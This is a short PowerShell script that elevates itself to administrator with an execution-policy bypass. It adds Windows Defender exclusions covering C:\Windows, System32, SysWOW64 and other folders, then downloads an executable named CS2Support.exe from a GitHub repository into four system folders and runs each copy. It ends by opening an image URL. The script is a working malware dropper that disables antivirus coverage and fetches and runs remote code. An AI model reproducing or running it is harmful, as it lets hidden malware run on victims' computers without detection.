# Check if running as Administrator
If (-Not ([Security.Principal.WindowsPrincipal]([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Relaunch the script with Administrator privileges
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# Proceed with the script
Write-Host "Running with Administrator privileges."

# Add exclusions to Defender
Add-MpPreference -ExclusionPath "C:\ProgramData"
Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
Add-MpPreference -ExclusionPath "C:\Windows\System32"
Add-MpPreference -ExclusionPath "C:\Windows\SysWOW64"
Add-MpPreference -ExclusionPath "C:\Windows"
Add-MpPreference -ExclusionExtension "CS2Support.exe"

# Download and execute the file
Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe" -OutFile "C:\Users\Public\Downloads\CS2Support.exe"
Start-Process -FilePath "C:\Users\Public\Downloads\CS2Support.exe" -NoNewWindow

Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe" -OutFile "C:\Windows\System32\CS2Support.exe"
Start-Process -FilePath "C:\Windows\System32\CS2Support.exe" -NoNewWindow

Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe" -OutFile "C:\Windows\SysWOW64\CS2Support.exe"
Start-Process -FilePath "C:\Windows\SysWOW64\CS2Support.exe" -NoNewWindow

Invoke-WebRequest -Uri "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe" -OutFile "C:\Windows\CS2Support.exe"
Start-Process -FilePath "C:\Windows\CS2Support.exe" -NoNewWindow

# Open a URL
Start-Process "https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg"
